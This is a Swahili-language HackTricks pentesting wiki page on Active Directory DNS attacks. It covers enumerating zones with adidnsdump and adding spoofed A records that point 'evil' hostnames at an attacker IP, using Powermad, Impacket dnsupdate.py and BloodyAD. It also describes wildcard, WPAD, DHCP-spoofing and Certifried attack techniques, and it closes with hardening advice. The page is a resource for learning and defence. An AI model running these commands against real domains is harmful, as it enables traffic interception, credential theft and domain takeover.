# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Kwa default, **mtumiaji yeyote** katika Active Directory anaweza **kuorodhesha rekodi zote za DNS** katika eneo au maeneo ya Forest DNS, sawa na uhamishaji wa eneo (watumiaji wanaweza orodhesha vitu vya watoto vya eneo la DNS katika mazingira ya AD).

Zana [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) inaruhusu **kuorodhesha** na **kutoa** **rekodi zote za DNS** katika eneo kwa madhumuni ya upelelezi wa mitandao ya ndani.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Aprili 2025) inaongeza matokeo ya JSON/Greppable (`--json`), ufumbuzi wa DNS wa multi-threaded na msaada wa TLS 1.2/1.3 wakati wa kuunganisha na LDAPS

Kwa maelezo zaidi soma [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Kuunda / Kubadilisha rekodi (ADIDNS spoofing)

Kwa sababu kundi la **Authenticated Users** lina **Create Child** kwenye DACL ya eneo kwa chaguo-msingi, akaunti yoyote ya kikoa (au akaunti ya kompyuta) inaweza kujiandikisha rekodi za ziada. Hii inaweza kutumika kwa ajili ya kuiba trafiki, kulazimisha NTLM relay au hata kuathiri kikoa kwa ukamilifu.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py inakuja na Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Common attack primitives

1. **Wildcard record** – `*.<zone>` inageuza seva ya AD DNS kuwa mrespondere wa kampuni nzima kama vile LLMNR/NBNS spoofing. Inaweza kutumika vibaya kukamata NTLM hashes au kuzipeleka kwa LDAP/SMB.  (Inahitaji WINS-lookup izuiliwe.)
2. **WPAD hijack** – ongeza `wpad` (au rekodi ya **NS** inayotaja mwenyeji wa mshambuliaji ili kupita Orodha ya Kuzuia Utafutaji wa Kimataifa) na kupeleka kwa uwazi maombi ya HTTP ya nje ili kukusanya taarifa za kuingia.  Microsoft ilirekebisha bypasses za wildcard/ DNAME (CVE-2018-8320) lakini **rekodi za NS bado zinafanya kazi**.
3. **Stale entry takeover** – dai anwani ya IP ambayo hapo awali ilikuwa ya workstation na rekodi ya DNS inayohusiana bado itatatuliwa, ikiruhusu ugawaji wa rasilimali ulio na vizuizi au mashambulizi ya Shadow-Credentials bila kugusa DNS kabisa.
4. **DHCP → DNS spoofing** – kwenye usanidi wa kawaida wa Windows DHCP+DNS mshambuliaji asiye na uthibitisho kwenye subnet hiyo hiyo anaweza kuandika tena rekodi yoyote ya A iliyopo (ikiwemo Domain Controllers) kwa kutuma maombi ya DHCP yaliyotengenezwa ambayo yanachochea masasisho ya DNS ya kidinamik (Akamai “DDSpoof”, 2023).  Hii inatoa mashine katikati ya Kerberos/LDAP na inaweza kusababisha kuchukuliwa kwa eneo lote.
5. **Certifried (CVE-2022-26923)** – badilisha `dNSHostName` ya akaunti ya mashine unayodhibiti, sajili rekodi ya A inayolingana, kisha omba cheti kwa jina hilo ili kujifanya kuwa DC. Zana kama **Certipy** au **BloodyAD** zinafanya mchakato huo kuwa wa kiotomatiki kabisa.

---

## Detection & hardening

* Kataza **Authenticated Users** haki ya *Create all child objects* kwenye maeneo nyeti na ugawanye masasisho ya kidinamik kwa akaunti maalum inayotumiwa na DHCP.
* Ikiwa masasisho ya kidinamik yanahitajika, weka eneo kuwa **Secure-only** na kuwezesha **Name Protection** katika DHCP ili tu kituo cha kompyuta mwenyewe kiweze kuandika tena rekodi yake mwenyewe.
* Fuata IDs za matukio ya Seva ya DNS 257/252 (masasisho ya kidinamik), 770 (hamisho la eneo) na maandiko ya LDAP kwa `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Zuia majina hatari (`wpad`, `isatap`, `*`) kwa rekodi isiyo na madhara au kupitia Orodha ya Kuzuia Utafutaji wa Kimataifa.
* Hifadhi seva za DNS zikiwa na masasisho – e.g., makosa ya RCE CVE-2024-26224 na CVE-2024-26231 yamefikia **CVSS 9.8** na yanaweza kutumiwa kwa mbali dhidi ya Domain Controllers.

## References

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, bado rejeleo la de-facto kwa mashambulizi ya wildcard/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
{{#include ../../banners/hacktricks-training.md}}
